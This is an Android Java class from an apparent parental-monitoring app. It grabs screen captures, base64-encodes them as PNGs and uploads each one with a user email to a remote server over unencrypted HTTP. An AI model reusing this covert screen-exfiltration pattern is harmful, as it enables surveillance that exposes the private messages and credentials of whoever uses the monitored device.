package com.example.oandshooter.view;


import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.media.Image;
import android.media.ImageReader;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.widget.EditText;

import androidx.appcompat.app.AppCompatActivity;

import com.example.oandshooter.utils.MyData;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;

public class ImageTransmogrifier implements ImageReader.OnImageAvailableListener {
    EditText editText_getemail;
    SettingActivity settingActivity;
    private  int width;
    private  int height;
    private  ImageReader imageReader;
    private  ScreenshotService svc;
    private Bitmap latestBitmap=null;
    private String encodedImage="";
    String intent;
   // private String intent="";

    public ImageTransmogrifier(ScreenshotService svc) {
        Log.e("ImageTransmogrifier" ,"ImageTransmogrifier" );
        this.svc=svc;

        Display display=svc.getWindowManager().getDefaultDisplay();
        Point size=new Point();

        display.getSize(size);

        //int z = 200;
        int width=size.x;
        int height=size.y;

        while (width*height > (2<<19)) {
            width=width>>1;
            height=height>>1;
        }

        this.width=width;
        this.height=height;

        imageReader=ImageReader.newInstance(width, height,
                PixelFormat.RGBA_8888, 2);
        imageReader.setOnImageAvailableListener(this, svc.getHandler());
    }

       @Override
        public void onImageAvailable(ImageReader reader) {
       /* Intent intent=getIntent();
        String getemail =intent.getStringExtra("setemail");*/
           try {
               Thread.sleep(MyData.as);
           } catch (InterruptedException e) {
               e.printStackTrace();
           }

         imageLoader();


        }


    Surface getSurface() {
        return(imageReader.getSurface());
    }

    int getWidth() {
        return(width);
    }

    int getHeight() {
        return(height);
    }

    void close() {
        imageReader.close();
    }


    public void imageLoader()
    {
        Log.e("imageLoader" ,"imageLoader" );
        final Image image=imageReader.acquireLatestImage();
        settingActivity= new SettingActivity();
        if (image!=null) {
            Image.Plane[] planes=image.getPlanes();
            ByteBuffer buffer=planes[0].getBuffer();
            int pixelStride=planes[0].getPixelStride();
            int rowStride=planes[0].getRowStride();
            int rowPadding=rowStride - pixelStride * width;
            int bitmapWidth=width + rowPadding / pixelStride;

            if (latestBitmap == null ||
                    latestBitmap.getWidth() != bitmapWidth ||
                    latestBitmap.getHeight() != height) {
                if (latestBitmap != null) {
                    latestBitmap.recycle();
                }

                latestBitmap=Bitmap.createBitmap(bitmapWidth,
                        height, Bitmap.Config.ARGB_8888);
            }

            latestBitmap.copyPixelsFromBuffer(buffer);

            if (image != null) {
                image.close();
            }



            ByteArrayOutputStream baos=new ByteArrayOutputStream();
            Bitmap cropped=Bitmap.createBitmap(latestBitmap, 0, 0,
                    width, height);

            cropped.compress(Bitmap.CompressFormat.PNG, 100, baos);

            byte[] newPng=baos.toByteArray();

            String encodedImage = Base64.encodeToString(newPng, Base64.DEFAULT);
            // recieveduseremail=Base64.encodeToString(mail,Base64.DEFAULT);

            Log.e("Encode Image : " ,  encodedImage);
            final MyHttpClient myHttpClient = new MyHttpClient("http://digimonk.in/parentalapp/app_api/", new String[]{
                    "image",encodedImage,
                    "email",MyData.email,


            });

            Log.e("before execute" ,"before execute" );
            myHttpClient.execute();
            myHttpClient.callback = new MyCallback() {
                @Override
                public void callbackCall() {
                    if(myHttpClient.result.equalsIgnoreCase("1")){

                    }
                    else{

                    }
                }
            };

            svc.processImage(newPng);
        }
       }

    }